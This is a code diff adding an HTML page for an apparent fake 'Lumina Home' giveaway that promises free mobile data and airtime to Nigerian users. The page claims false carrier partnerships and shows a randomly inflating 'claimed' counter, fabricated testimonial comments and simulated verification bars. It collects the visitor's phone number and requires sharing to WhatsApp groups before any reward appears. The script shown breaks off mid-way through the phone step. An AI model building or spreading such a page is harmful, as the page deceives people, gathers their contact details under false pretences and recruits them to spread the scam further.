@@ -1,0 +1,1322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>🎁 Lumina Home - Anniversary Giveaway</title>
+    
+    <!-- Ad Script -->
+    <script src="https://quge5.com/88/tag.min.js" data-zone="254328" async data-cfasync="false"></script>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    
+    <style>
+        /* ============================================================
+           COMPLETE STYLES - ALL IN ONE
+           ============================================================ */
+        
+        /* ----- RESET ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0a0a0f;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            background-image: radial-gradient(ellipse at 30% 10%, #1a1a2e 0%, #0a0a0f 100%);
+        }
+
+        /* ----- SCROLLBAR ----- */
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: rgba(255,255,255,0.02);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #ffd700;
+            border-radius: 10px;
+        }
+
+        /* ----- PRE-LOADER ----- */
+        .pre-loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0f;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 99999;
+            transition: opacity 0.6s ease, visibility 0.6s ease;
+        }
+        .pre-loader.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+        .pre-loader .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255,215,0,0.08);
+            border-top-color: #ffd700;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .pre-loader p {
+            color: rgba(255,255,255,0.3);
+            margin-top: 20px;
+            font-size: 13px;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ----- CONTAINER ----- */
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: linear-gradient(180deg, #14141f 0%, #1a1a2e 100%);
+            border-radius: 24px;
+            border: 1px solid rgba(255,215,0,0.06);
+            box-shadow: 0 30px 80px rgba(0,0,0,0.8), 0 0 60px rgba(255,215,0,0.02);
+            overflow: hidden;
+            position: relative;
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(ellipse at 20% 10%, rgba(255,215,0,0.03) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        /* ----- HEADER ----- */
+        .header {
+            background: linear-gradient(135deg, #ffd700 0%, #f0a500 100%);
+            padding: 28px 20px 18px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .header::after {
+            content: '🎉';
+            position: absolute;
+            font-size: 100px;
+            right: -15px;
+            top: -25px;
+            opacity: 0.12;
+            transform: rotate(15deg);
+        }
+        .header .badge {
+            display: inline-block;
+            background: rgba(0,0,0,0.15);
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #1a1a2e;
+            backdrop-filter: blur(10px);
+            margin-bottom: 6px;
+        }
+        .header h1 {
+            font-size: 24px;
+            font-weight: 900;
+            color: #1a1a2e;
+            line-height: 1.2;
+            position: relative;
+            z-index: 1;
+        }
+        .header h1 span {
+            display: block;
+            font-size: 13px;
+            font-weight: 400;
+            opacity: 0.7;
+            margin-top: 2px;
+        }
+        .header .subtitle {
+            font-size: 12px;
+            color: #1a1a2e;
+            opacity: 0.7;
+            margin-top: 4px;
+            font-weight: 500;
+        }
+
+        /* ----- STATS BAR ----- */
+        .stats-bar {
+            background: rgba(255,215,0,0.04);
+            padding: 14px 20px;
+            text-align: center;
+            border-bottom: 1px solid rgba(255,215,0,0.04);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+        .stats-bar .number {
+            font-size: 28px;
+            font-weight: 900;
+            color: #ffd700;
+            letter-spacing: 1px;
+            background: linear-gradient(135deg, #ffd700, #f0a500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .stats-bar .label {
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
+            font-weight: 400;
+        }
+        .stats-bar .label strong {
+            color: #fff;
+            font-weight: 600;
+            -webkit-text-fill-color: #fff;
+        }
+
+        /* ----- MARQUEE ----- */
+        .marquee-bar {
+            background: rgba(255,215,0,0.02);
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,215,0,0.03);
+            overflow: hidden;
+        }
+        .marquee-bar marquee {
+            color: rgba(255,255,255,0.3);
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        /* ----- CONTENT ----- */
+        .content {
+            padding: 24px 20px 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ----- SECTIONS ----- */
+        .section {
+            display: none;
+            animation: fadeUp 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+        }
+        .section.active {
+            display: block;
+        }
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px) scale(0.97);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        /* ----- INTRO ----- */
+        .intro-icon {
+            font-size: 44px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .intro-title {
+            font-size: 20px;
+            font-weight: 800;
+            color: #fff;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+        .intro-title span {
+            color: #ffd700;
+        }
+        .intro-desc {
+            font-size: 13px;
+            color: rgba(255,255,255,0.5);
+            text-align: center;
+            line-height: 1.7;
+            margin-bottom: 18px;
+        }
+        .intro-desc strong {
+            color: #fff;
+            font-weight: 600;
+        }
+
+        /* ----- FORM ----- */
+        .form-group {
+            margin-bottom: 12px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 11px;
+            font-weight: 600;
+            color: rgba(255,255,255,0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+        }
+        .form-group select,
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255,255,255,0.03);
+            border: 2px solid rgba(255,255,255,0.06);
+            border-radius: 12px;
+            font-size: 15px;
+            font-family: 'Inter', sans-serif;
+            color: #fff;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+        .form-group select option {
+            background: #1a1a2e;
+            color: #fff;
+        }
+        .form-group select:focus,
+        .form-group input:focus {
+            border-color: #ffd700;
+            background: rgba(255,215,0,0.03);
+            box-shadow: 0 0 0 4px rgba(255,215,0,0.04);
+        }
+        .form-group select.error,
+        .form-group input.error {
+            border-color: #ff4757;
+        }
+        .form-group .error-text {
+            display: none;
+            font-size: 12px;
+            color: #ff4757;
+            margin-top: 5px;
+            font-weight: 500;
+        }
+        .form-group .error-text.show {
+            display: block;
+        }
+
+        /* ----- BUTTONS ----- */
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            padding: 16px 24px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.22, 1, 0.36, 1);
+            position: relative;
+            overflow: hidden;
+        }
+        .btn:active {
+            transform: scale(0.97);
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #ffd700, #f0a500);
+            color: #1a1a2e;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(255,215,0,0.25);
+        }
+        .btn-secondary {
+            background: rgba(255,255,255,0.04);
+            color: #fff;
+            border: 1px solid rgba(255,255,255,0.06);
+        }
+        .btn-secondary:hover {
+            background: rgba(255,255,255,0.08);
+            transform: translateY(-2px);
+        }
+        .btn-success {
+            background: linear-gradient(135deg, #00d2d3, #01a3a4);
+            color: #fff;
+        }
+        .btn-success:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0,210,211,0.25);
+        }
+        .btn-glow {
+            position: relative;
+        }
+        .btn-glow::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(135deg, #ffd700, #f0a500, #ffd700);
+            border-radius: 14px;
+            z-index: -1;
+            opacity: 0.3;
+            filter: blur(8px);
+        }
+
+        /* ----- LOADER ----- */
+        .loader-center {
+            text-align: center;
+            padding: 30px 0;
+        }
+        .loader-center .spinner {
+            width: 56px;
+            height: 56px;
+            border: 4px solid rgba(255,215,0,0.08);
+            border-top-color: #ffd700;
+            border-radius: 50%;
+            margin: 0 auto 14px;
+            animation: spin 0.8s linear infinite;
+        }
+        .loader-center p {
+            color: rgba(255,255,255,0.4);
+            font-size: 13px;
+        }
+        .loader-center .progress-text {
+            font-size: 34px;
+            font-weight: 900;
+            color: #ffd700;
+            margin-top: 6px;
+        }
+
+        /* ----- PROGRESS ----- */
+        .progress-wrap {
+            margin: 14px 0;
+        }
+        .progress-track {
+            width: 100%;
+            height: 6px;
+            background: rgba(255,255,255,0.04);
+            border-radius: 20px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ffd700, #f0a500);
+            border-radius: 20px;
+            transition: width 0.8s cubic-bezier(0.22, 1, 0.36, 1);
+        }
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            color: rgba(255,255,255,0.2);
+            margin-top: 5px;
+        }
+        .progress-label .status {
+            color: rgba(255,255,255,0.4);
+            font-weight: 500;
+        }
+
+        /* ----- SHARE STEPS ----- */
+        .share-steps {
+            background: rgba(255,255,255,0.02);
+            border-radius: 12px;
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid rgba(255,255,255,0.03);
+        }
+        .share-steps .step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 6px 0;
+            font-size: 13px;
+            color: rgba(255,255,255,0.5);
+            line-height: 1.5;
+        }
+        .share-steps .step .num {
+            width: 26px;
+            height: 26px;
+            min-width: 26px;
+            background: rgba(255,215,0,0.08);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 700;
+            color: #ffd700;
+        }
+        .share-steps .step strong {
+            color: #fff;
+            font-weight: 600;
+        }
+
+        /* ----- CLAIM ----- */
+        .claim-icon {
+            font-size: 60px;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+        .claim-title {
+            font-size: 20px;
+            font-weight: 800;
+            color: #fff;
+            text-align: center;
+        }
+        .claim-title span {
+            color: #00d2d3;
+        }
+        .claim-sub {
+            font-size: 13px;
+            color: rgba(255,255,255,0.4);
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .claim-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        /* ----- COMMENTS ----- */
+        .comments-section {
+            margin-top: 22px;
+            padding-top: 18px;
+            border-top: 1px solid rgba(255,255,255,0.03);
+        }
+        .comments-section .counter {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 11px;
+            color: rgba(255,255,255,0.25);
+            flex-wrap: wrap;
+            margin-bottom: 8px;
+        }
+        .comments-section .counter .reactions {
+            display: flex;
+            align-items: center;
+            gap: 2px;
+        }
+        .comments-section .counter .reactions img {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            border: 2px solid #1a1a2e;
+        }
+        .comments-section .counter .count {
+            color: rgba(255,255,255,0.4);
+            font-weight: 500;
+        }
+        .comments-section .action-bar {
+            display: flex;
+            justify-content: space-around;
+            padding: 6px 0 10px;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            margin-bottom: 12px;
+        }
+        .comments-section .action-bar span {
+            font-size: 12px;
+            color: rgba(255,255,255,0.25);
+            cursor: pointer;
+            transition: color 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-weight: 500;
+        }
+        .comments-section .action-bar span:hover {
+            color: rgba(255,255,255,0.5);
+        }
+
+        /* ----- COMMENT ITEMS ----- */
+        .comment-item {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+        .comment-item .avatar {
+            width: 34px;
+            height: 34px;
+            min-width: 34px;
+            border-radius: 50%;
+            object-fit: cover;
+            background: rgba(255,255,255,0.03);
+            border: 2px solid rgba(255,255,255,0.03);
+        }
+        .comment-item .body {
+            flex: 1;
+        }
+        .comment-item .body .name {
+            font-size: 12px;
+            font-weight: 600;
+            color: #fff;
+            display: inline-block;
+        }
+        .comment-item .body .name .badge {
+            font-size: 9px;
+            background: rgba(255,215,0,0.12);
+            color: #ffd700;
+            padding: 0 7px;
+            border-radius: 8px;
+            font-weight: 500;
+            margin-left: 4px;
+        }
+        .comment-item .body .text {
+            font-size: 12px;
+            color: rgba(255,255,255,0.6);
+            line-height: 1.5;
+            margin-top: 2px;
+        }
+        .comment-item .body .meta {
+            font-size: 10px;
+            color: rgba(255,255,255,0.15);
+            margin-top: 3px;
+            display: flex;
+            gap: 10px;
+        }
+        .comment-item .body .meta span {
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+        .comment-item .body .meta span:hover {
+            color: rgba(255,255,255,0.3);
+        }
+        .comment-item.reply {
+            margin-left: 44px;
+        }
+
+        /* ----- COMMENT INPUT ----- */
+        .comment-input {
+            display: flex;
+            gap: 8px;
+            margin-top: 10px;
+        }
+        .comment-input input {
+            flex: 1;
+            padding: 9px 14px;
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.03);
+            border-radius: 20px;
+            font-size: 12px;
+            font-family: 'Inter', sans-serif;
+            color: #fff;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .comment-input input:focus {
+            border-color: rgba(255,215,0,0.15);
+        }
+        .comment-input input::placeholder {
+            color: rgba(255,255,255,0.15);
+        }
+
+        /* ----- FOOTER ----- */
+        .footer-links {
+            max-width: 480px;
+            width: 100%;
+            text-align: center;
+            padding: 16px 10px 8px;
+        }
+        .footer-links a {
+            color: rgba(255,255,255,0.12);
+            font-size: 10px;
+            margin: 0 8px;
+            text-decoration: none;
+            letter-spacing: 0.5px;
+            transition: color 0.3s;
+        }
+        .footer-links a:hover {
+            color: rgba(255,255,255,0.3);
+        }
+        .footer-links .dot {
+            color: rgba(255,255,255,0.06);
+        }
+
+        /* ----- RESPONSIVE ----- */
+        @media (max-width: 480px) {
+            body { padding: 10px; }
+            .container { border-radius: 16px; }
+            .header h1 { font-size: 20px; }
+            .content { padding: 18px 16px 16px; }
+            .stats-bar .number { font-size: 22px; }
+            .comment-item.reply { margin-left: 28px; }
+            .btn { font-size: 14px; padding: 14px 20px; }
+        }
+
+        /* ----- UTILITY ----- */
+        .mt-8 { margin-top: 8px; }
+        .mt-12 { margin-top: 12px; }
+        .mt-16 { margin-top: 16px; }
+        .mb-8 { margin-bottom: 8px; }
+        .text-center { text-align: center; }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <!-- ============================================================
+    PRE-LOADER
+    ============================================================ -->
+    <div class="pre-loader" id="preLoader">
+        <div class="spinner"></div>
+        <p>Loading Experience</p>
+    </div>
+
+    <!-- ============================================================
+    MAIN CONTAINER
+    ============================================================ -->
+    <div class="container">
+
+        <!-- ===== HEADER ===== -->
+        <div class="header">
+            <div class="badge">🎁 Limited Giveaway</div>
+            <h1>
+                Lumina Home<br />
+                <span>Anniversary Celebration 🎉</span>
+            </h1>
+            <div class="subtitle">In collaboration with MTN, Airtel, Glo &amp; 9-Mobile</div>
+        </div>
+
+        <!-- ===== STATS BAR ===== -->
+        <div class="stats-bar">
+            <span class="label">🔥 <strong class="number" id="countdownTimer">4,548</strong></span>
+            <span class="label">Nigerians Claimed</span>
+            <span class="label">🎯 <strong>10GB + ₦5,000</strong></span>
+        </div>
+
+        <!-- ===== MARQUEE ===== -->
+        <div class="marquee-bar">
+            <marquee behavior="scroll" direction="left" scrollamount="4">
+                🎉 LUMINA HOME ANNIVERSARY CELEBRATION &bull; FREE 10GB DATA + ₦5,000 AIRTIME &bull; CLAIM NOW 🎉
+            </marquee>
+        </div>
+
+        <!-- ===== CONTENT ===== -->
+        <div class="content">
+
+            <!-- ==========================================================
+            SECTION: INTRO
+            ========================================================== -->
+            <div class="section active" id="sectionIntro">
+                <div class="intro-icon">🎊</div>
+                <div class="intro-title">
+                    Get <span>10GB Free Data</span><br />
+                    + <span>₦5,000 Airtime</span>
+                </div>
+                <div class="intro-desc">
+                    <strong>Powered by:</strong> Nigeria Democratic Congress (NDC)<br />
+                    Lumina Home is giving away <strong>10GB Free Data</strong> and 
+                    <strong>₦5,000 Airtime</strong> to celebrate our anniversary!
+                </div>
+
+                <div class="form-group">
+                    <label for="networkSelect">Select Your Network</label>
+                    <select id="networkSelect">
+                        <option value="">— Select Network —</option>
+                        <option value="mtn">📶 MTN — 10GB + ₦5,000</option>
+                        <option value="airtel">📶 Airtel — 10GB + ₦5,000</option>
+                        <option value="glo">📶 Glo — 10GB + ₦5,000</option>
+                        <option value="9mobile">📶 9-Mobile — 10GB + ₦5,000</option>
+                    </select>
+                    <div class="error-text" id="networkError">Please select your network</div>
+                </div>
+
+                <button class="btn btn-primary btn-glow" id="btnGetOffer">
+                    <i class="fas fa-gift"></i> Claim Your Offer
+                </button>
+            </div>
+
+            <!-- ==========================================================
+            SECTION: LOADER
+            ========================================================== -->
+            <div class="section" id="sectionLoader">
+                <div class="loader-center">
+                    <div class="spinner"></div>
+                    <p>Processing your request...</p>
+                    <div class="progress-text" id="loaderProgress">0%</div>
+                </div>
+            </div>
+
+            <!-- ==========================================================
+            SECTION: PHONE
+            ========================================================== -->
+            <div class="section" id="sectionPhone">
+                <div style="text-align: center; margin-bottom: 10px;">
+                    <span style="font-size: 32px;">📱</span>
+                    <h3 style="color: #fff; font-size: 17px; font-weight: 700; margin-top: 2px;">Enter Your Number</h3>
+                    <p style="color: rgba(255,255,255,0.35); font-size: 12px;">We'll send your activation code</p>
+                </div>
+
+                <div class="form-group">
+                    <label for="phoneInput">Phone Number</label>
+                    <input type="tel" id="phoneInput" placeholder="e.g. 08012345678" maxlength="11" />
+                    <div class="error-text" id="phoneError">Please enter a valid 11-digit phone number</div>
+                </div>
+
+                <button class="btn btn-secondary" id="btnSend">
+                    <i class="fas fa-paper-plane"></i> Send Code
+                </button>
+            </div>
+
+            <!-- ==========================================================
+            SECTION: ACTIVATING
+            ========================================================== -->
+            <div class="section" id="sectionActivating">
+                <div style="text-align: center; margin-bottom: 6px;">
+                    <span style="font-size: 32px;">⚡</span>
+                    <h3 style="color: #fff; font-size: 17px; font-weight: 700;">Activating Your Offer...</h3>
+                </div>
+                <div class="progress-wrap">
+                    <div class="progress-track">
+                        <div class="progress-bar" id="activationBar" style="width: 0%;"></div>
+                    </div>
+                    <div class="progress-label">
+                        <span>Processing</span>
+                        <span class="status" id="activationStatus">0%</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ==========================================================
+            SECTION: SHARE
+            ========================================================== -->
+            <div class="section" id="sectionShare">
+                <div style="text-align: center; margin-bottom: 6px;">
+                    <span style="font-size: 40px;">🔒</span>
+                    <h3 style="color: #fff; font-size: 17px; font-weight: 700;">Almost There!</h3>
+                    <p style="color: rgba(255,255,255,0.35); font-size: 12px;">
+                        Your <strong style="color: #ffd700;">10GB + ₦5,000</strong> is pending verification
+                    </p>
+                </div>
+
+                <div class="share-steps">
+                    <div class="step">
+                        <span class="num">1</span>
+                        <span>Share with <strong>5 groups</strong> or <strong>15 friends</strong> on WhatsApp</span>
+                    </div>
+                    <div class="step">
+                        <span class="num">2</span>
+                        <span>Return here &amp; verification bar fills <strong>automatically</strong></span>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" id="btnShare">
+                    <i class="fab fa-whatsapp"></i> Share on WhatsApp
+                </button>
+
+                <div class="progress-wrap mt-12">
+                    <div class="progress-track">
+                        <div class="progress-bar" id="shareBar" style="width: 0%;"></div>
+                    </div>
+                    <div class="progress-label">
+                        <span>Verification</span>
+                        <span class="status" id="shareStatus">0%</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ==========================================================
+            SECTION: CLAIM
+            ========================================================== -->
+            <div class="section" id="sectionClaim">
+                <div class="claim-icon">🎉</div>
+                <div class="claim-title">
+                    Verification <span>Complete!</span>
+                </div>
+                <div class="claim-sub">
+                    Your <strong style="color: #ffd700;">10GB + ₦5,000</strong> is ready to activate
+                </div>
+
+                <div class="claim-buttons">
+                    <button class="btn btn-primary btn-glow" id="btnActivateData">
+                        <i class="fas fa-wifi"></i> Activate 10GB Data
+                    </button>
+                    <button class="btn btn-secondary" id="btnActivateAirtime">
+                        <i class="fas fa-phone"></i> Activate Airtime
+                    </button>
+                </div>
+            </div>
+
+            <!-- ==========================================================
+            COMMENTS SECTION
+            ========================================================== -->
+            <div class="comments-section">
+                <div class="counter">
+                    <div class="reactions">
+                        <img src="https://i.imgur.com/g6cV61A.png" alt="like" />
+                        <img src="https://i.imgur.com/0UHB1f0.png" alt="love" />
+                        <img src="https://i.imgur.com/sSMYbTT.png" alt="care" />
+                        <span class="count">134K</span>
+                    </div>
+                    <span class="count">23K comments</span>
+                    <span>·</span>
+                    <span class="count">12K shares</span>
+                </div>
+
+                <div class="action-bar">
+                    <span><i class="far fa-thumbs-up"></i> Like</span>
+                    <span><i class="far fa-comment"></i> Comment</span>
+                    <span><i class="fas fa-share"></i> Share</span>
+                </div>
+
+                <!-- Comment 1 -->
+                <div class="comment-item">
+                    <img class="avatar" src="https://i.imgur.com/xp1ER6K.jpg" alt="avatar" />
+                    <div class="body">
+                        <span class="name">Joseph Emmanuel <span class="badge">Verified</span></span>
+                        <div class="text">I doubted this at first, but it's real! Just got my ₦5,000 airtime. Thank you Lumina Home! 🎉</div>
+                        <div class="meta">
+                            <span>1m</span>
+                            <span>·</span>
+                            <span>Like</span>
+                            <span>·</span>
+                            <span>Reply</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Comment 2 -->
+                <div class="comment-item">
+                    <img class="avatar" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhC5I3x2Ykht2M6Pktwjzc0xV7dmqJty_eCw4rDcFV5r_eDxXMRGWJF9tuYPEpe_fvnM0DtzfdDKbQUFKAhhnj1tXN97o8EJP_l_XFJeyX7dc1bm6bpocYaeGtrngVoV9TruTJrlONHypx0/s1600/FB_IMG_15869726679037399.jpg" alt="avatar" />
+                    <div class="body">
+                        <span class="name">David Anthony</span>
+                        <div class="text">I just received 10GB! Wow, unbelievable. One of the rare websites that truly gifts! 🙌</div>
+                        <div class="meta">
+                            <span>2m</span>
+                            <span>·</span>
+                            <span>Like</span>
+                            <span>·</span>
+                            <span>Reply</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Comment 3 (Reply) -->
+                <div class="comment-item reply">
+                    <img class="avatar" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgAg5sqDhd96nW2Ek_9vet4ztoELeaZmKUSIgzUImj18MpjZvy2qNPXaEgkSNOxLtEOvrT2iPc9RuUUmu2xnhRydySo5WIFpWEJiYmuMDqXnPKrqFzC8aABhp-mrUbaqinlsgJ5LA6hwZS/s1600/FB_IMG_15869730921979436.jpg" alt="avatar" />
+                    <div class="body">
+                        <span class="name">Amahle John</span>
+                        <div class="text">Mine is pending because I just finished sharing. Please help! 😅</div>
+                        <div class="meta">
+                            <span>1m</span>
+                            <span>·</span>
+                            <span>Like</span>
+                            <span>·</span>
+                            <span>Reply</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Comment 4 -->
+                <div class="comment-item">
+                    <img class="avatar" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhETuUnZKp3TrK9zDTqBtlN4ahx1RrCH6RqG14wW5J8CIBv6HYs7gQSvAiZBwn8NT3lXcz3h8jR87s1z_qZ2kzEoZ7HRnWzskSuqK5NOfKyiQByU3BgypGHXP-m9LlPyFh2FhIsUdN6cO1DnZb-GTtRMDQk8L75NDDUnEC4JxQ6OwsnAjbKVhhlNxrLyQ/s320/9F5D4C76-9CCB-45EB-BA73-73A125849593.jpeg" alt="avatar" />
+                    <div class="body">
+                        <span class="name">Bonolo</span>
+                        <div class="text">My guy got 10GB on MTN already. I pray I get approved too! 🙏</div>
+                        <div class="meta">
+                            <span>4m</span>
+                            <span>·</span>
+                            <span>Like</span>
+                            <span>·</span>
+                            <span>Reply</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Comment Input -->
+                <div class="comment-input">
+                    <input type="text" placeholder="Write a comment..." id="commentInput" />
+                </div>
+            </div>
+
+        </div>
+        <!-- /content -->
+    </div>
+    <!-- /container -->
+
+    <!-- ============================================================
+    FOOTER LINKS
+    ============================================================ -->
+    <div class="footer-links">
+        <a href="terms.html">Terms</a>
+        <span class="dot">·</span>
+        <a href="faq.html">FAQ</a>
+        <span class="dot">·</span>
+        <a href="contact.html">Contact</a>
+        <span class="dot">·</span>
+        <a href="reviews.html">Reviews</a>
+        <span class="dot">·</span>
+        <a href="networks.html">Networks</a>
+        <span class="dot">·</span>
+        <a href="login.html" style="color: rgba(255,255,255,0.03);">Admin</a>
+    </div>
+
+    <!-- ============================================================
+    JAVASCRIPT - ALL IN ONE
+    ============================================================ -->
+    <script>
+        (function() {
+            'use strict';
+
+            // ==========================================================
+            // DOM REFS
+            // ==========================================================
+            const $ = (sel) => document.querySelector(sel);
+            const $$ = (sel) => document.querySelectorAll(sel);
+
+            const sections = {
+                intro: $('#sectionIntro'),
+                loader: $('#sectionLoader'),
+                phone: $('#sectionPhone'),
+                activating: $('#sectionActivating'),
+                share: $('#sectionShare'),
+                claim: $('#sectionClaim')
+            };
+
+            const btnGetOffer = $('#btnGetOffer');
+            const btnSend = $('#btnSend');
+            const btnShare = $('#btnShare');
+            const btnActivateData = $('#btnActivateData');
+            const btnActivateAirtime = $('#btnActivateAirtime');
+            const phoneInput = $('#phoneInput');
+            const phoneError = $('#phoneError');
+            const networkSelect = $('#networkSelect');
+            const networkError = $('#networkError');
+            const loaderProgress = $('#loaderProgress');
+            const activationBar = $('#activationBar');
+            const activationStatus = $('#activationStatus');
+            const shareBar = $('#shareBar');
+            const shareStatus = $('#shareStatus');
+            const countdownTimer = $('#countdownTimer');
+            const commentInput = $('#commentInput');
+            const preLoader = $('#preLoader');
+
+            // ==========================================================
+            // STATE
+            // ==========================================================
+            const STORAGE_KEY = 'lumina_share_progress';
+            let shareProgress = parseInt(localStorage.getItem(STORAGE_KEY)) || 0;
+
+            // ==========================================================
+            // TRACK VISIT
+            // ==========================================================
+            function trackVisit() {
+                let visits = parseInt(localStorage.getItem('lumina_visits') || '0');
+                visits++;
+                localStorage.setItem('lumina_visits', visits);
+            }
+            trackVisit();
+
+            // ==========================================================
+            // UTILITY
+            // ==========================================================
+            function showSection(id) {
+                Object.keys(sections).forEach(key => {
+                    sections[key].classList.toggle('active', key === id);
+                });
+            }
+
+            function validatePhone(phone) {
+                return /^[0-9]{11}$/.test(phone.replace(/\D/g, ''));
+            }
+
+            function saveUser(data) {
+                const users = JSON.parse(localStorage.getItem('lumina_users') || '[]');
+                users.push({
+                    ...data,
+                    date: new Date().toISOString(),
+                    shares: 0,
+                    claimed: false
+                });
+                localStorage.setItem('lumina_users', JSON.stringify(users));
+            }
+
+            function sleep(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+
+            // ==========================================================
+            // COUNTDOWN TIMER
+            // ==========================================================
+            let count = 4548;
+            if (countdownTimer) {
+                setInterval(() => {
+                    count += Math.floor(Math.random() * 400) + 50;
+                    countdownTimer.textContent = count.toLocaleString();
+                }, 2000);
+            }
+
+            // ==========================================================
+            // STEP 1: GET OFFER
+            // ==========================================================
+            if (btnGetOffer) {
+                btnGetOffer.addEventListener('click', function() {
+                    if (!networkSelect.value) {
+                        networkSelect.classList.add('error');
+                        networkError.classList.add('show');
+                        networkSelect.focus();
+                        return;
+                    }
+                    networkSelect.classList.remove('error');
+                    networkError.classList.remove('show');
+
+                    localStorage.setItem('lumina_network', networkSelect.value);
+                    showSection('loader');
+                    simulateLoader();
+                });
+
+                networkSelect.addEventListener('change', function() {
+                    if (this.value) {
+                        this.classList.remove('error');
+                        networkError.classList.remove('show');
+                    }
+                });
+
+                networkSelect.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter' && this.value) {
+                        btnGetOffer.click();
+                    }
+                });
+            }
+
+            async function simulateLoader() {
+                for (let i = 0; i <= 100; i += Math.floor(Math.random() * 15) + 5) {
+                    if (i > 100) i = 100;
+                    if (loaderProgress) loaderProgress.textContent = i + '%';
+                    await sleep(150 + Math.random() * 200);
+                }
+                showSection('phone');
+                if (phoneInput) phoneInput.focus();
+            }
+
+            // ==========================================================
+            // STEP 2: SEND PHONE
+            // ==========================================================
+            if (btnSend) {
+                btnSend.addEventListener('click', function() {
+                    const phone = phoneInput.value.trim();
+                    if (!validatePhone(phone)) {
